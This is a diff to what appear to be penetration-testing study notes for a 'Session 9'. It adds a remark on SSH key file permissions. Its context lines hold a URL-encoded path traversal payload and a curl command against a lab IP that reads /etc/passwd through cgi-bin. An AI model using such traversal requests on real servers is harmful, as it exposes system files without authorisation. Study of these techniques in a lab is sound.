@@ -18,4 +18,6 @@ concept: "Session 9"
 		- become
 		- **%2e%2e**/%2e%2e/%2e%2e/etc/passwd
 	- `curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
+	- `Permissions 0644 for '/home/kali/dt_key' are too open.`
+		- means the rsa key file has perm besides read for owner (400).
 #### File inclusion
